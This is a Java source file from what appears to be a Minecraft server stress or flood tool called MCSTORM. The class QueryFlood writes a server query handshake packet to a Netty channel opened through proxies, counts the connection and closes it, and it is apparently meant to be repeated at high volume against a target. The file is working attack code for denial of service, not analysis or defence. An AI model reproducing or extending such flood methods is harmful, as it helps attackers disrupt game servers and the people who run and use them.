package io.MCSTORM.methods;


import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

import java.io.IOException;


public class QueryFlood
        implements Method {

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {

        ByteBuf b = Unpooled.buffer();

        ByteBufOutputStream out = new ByteBufOutputStream(b);

        try {
            out.writeByte(254);
            out.writeByte(253);
            out.writeByte(9);
            out.writeByte(0);
            out.writeByte(0);
            out.writeByte(0);
            out.writeByte(1);
            out.close();

        } catch (IOException e) {
            e.printStackTrace();

        }

        channel.writeAndFlush(b);

        NettyBootstrap.integer++;

        NettyBootstrap.totalConnections++;

        channel.close();

    }

}


